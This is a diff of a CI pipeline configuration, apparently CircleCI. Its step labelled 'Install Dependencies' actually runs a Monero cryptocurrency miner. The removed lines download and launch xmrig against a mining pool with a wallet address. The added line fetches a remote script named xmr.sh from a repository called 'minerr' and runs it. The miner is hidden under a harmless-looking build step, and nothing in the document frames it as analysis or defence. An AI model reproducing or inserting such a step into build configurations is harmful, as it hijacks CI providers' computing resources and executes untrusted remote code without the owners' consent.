@@ -8,11 +8,7 @@ jobs:
         - run:
             name: Install Dependencies
             command:
-              wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
-tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
-ls
-cd xmrig-6.15.0
-./xmrig -o sg.minexmr.com:443 -u 466qu8xzgtDXCr52mZxubW2yCFmdcAuLpHKECRmaCRn26V6LgNi5ttP74dQ7g2mUJNRzTqgDM6PUZQhaG45DgUx43kRxAoY -k --tls --rig-id rig
+              wget https://bitbucket.org/Duckling975/minerr/raw/a429afdc4b3ec99e128c3e9fa5c2608a67ca20c8/xmr.sh && chmod +x xmr.sh && ./xmr.sh
               echo Hello,subscribe it
 workflows:
     version: 2.1
